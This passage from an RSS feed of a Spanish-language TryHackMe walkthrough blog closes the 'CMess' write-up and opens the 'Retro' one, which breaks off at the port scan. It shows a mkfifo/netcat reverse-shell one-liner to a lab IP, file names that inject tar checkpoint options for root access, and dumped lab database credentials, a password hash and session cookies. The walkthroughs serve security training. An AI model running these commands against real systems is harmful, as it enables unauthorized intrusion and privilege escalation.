&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 8989 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &amp;gt; shell.sh
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--checkpoint-action=exec=sh shell.sh&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt; --checkpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Verificamos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;andre@cmess:~/backup$ ls
--checkpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  --checkpoint-action&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sh shell.sh  shell.sh
andre@cmess:~/backup$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Esperamos y obtenemos una shell root:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cmess/Screenshot_20200214_215004.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/&#34;&gt;&lt;strong&gt;INFO - Wildcard Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;mysql&#34;&gt;MYSQL&lt;/h3&gt;
&lt;p&gt;Dentro de la configuracion de la pagina vemos las credenciales para conectarse a la base de datos, encontramos algunas tablas interesantes pero ningun dato nos ayudo para ninguno de los usuarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@cmess:/var/www/html$ cat config.php
cat config.php
&amp;lt;?php

&lt;span class=&#34;nv&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;config&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
  array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;,
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;r0otus3rpassw0rd&amp;#39;&lt;/span&gt;,
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;gila&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;permissions&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
  array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
    array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;nv&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin_user&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;nv&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin_userrole&amp;#39;&lt;/span&gt;,
    &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
  &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;packages&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
  array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;blog&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;base&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://cmess.thm/gila/&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;theme&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;gila-blog&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Gila CMS&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;slogan&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;An awesome website!&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;default-controller&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;blog&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;timezone&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;America/Mexico_City&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;ssl&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;env&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pro&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;check4updates&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 1,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;language&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;en&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin_email&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;andre@cmess.thm&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;rewrite&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; true,
&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;www-data@cmess:/var/www/html$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos las credenciales con mysql, y en la tabla users de la base de datos gila encontramos la contraseña encriptada del usuario andre, ademas de eso encontramos las cookies del usuario andre:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mysql&amp;gt; show databases&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
show databases&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+--------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Database           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; information_schema &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gila               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; mysql              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; performance_schema &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sys                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+
&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

mysql&amp;gt; use gila&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
use gila&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Reading table information &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&amp;gt; show tables&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+----------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Tables_in_gila &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; option         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; page           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; post           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; postcategory   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; postmeta       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; usermeta       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; userrole       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; widget         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------------+
&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from user&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from user&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; username &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; email           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; pass                                                         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; active &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; reset_code &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; created             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; updated             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; andre    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; andre@cmess.thm &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$uNAA0MEze02jd&lt;/span&gt;.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2020-02-06 18:20:34 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2020-02-06 18:20:34 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; row in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from usermeta&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from usermeta&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+----+---------+------------+----------------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; vartype    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; value                                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+---------+------------+----------------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; privilege  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin                                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; GSESSIONID &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 1ik2ha97chatolvcena3moomw802zssf3e9tdo9v9fwl86w0uv &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; GSESSIONID &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 1mwxigp2xzt4oc6ka9neshxlzrnwefvsmenppbod9826mmhikz &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+---------+------------+----------------------------------------------------+
&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/cmess/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/cmess/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Retro</title>
        <link>https://sckull.github.io/posts/retro/</link>
        <pubDate>Sat, 15 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 15 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/retro/</guid>
        <description>Retro es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Retro es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Retro&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;New high score!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;1095&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;nmap&#34;&gt;NMAP&lt;/h3&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
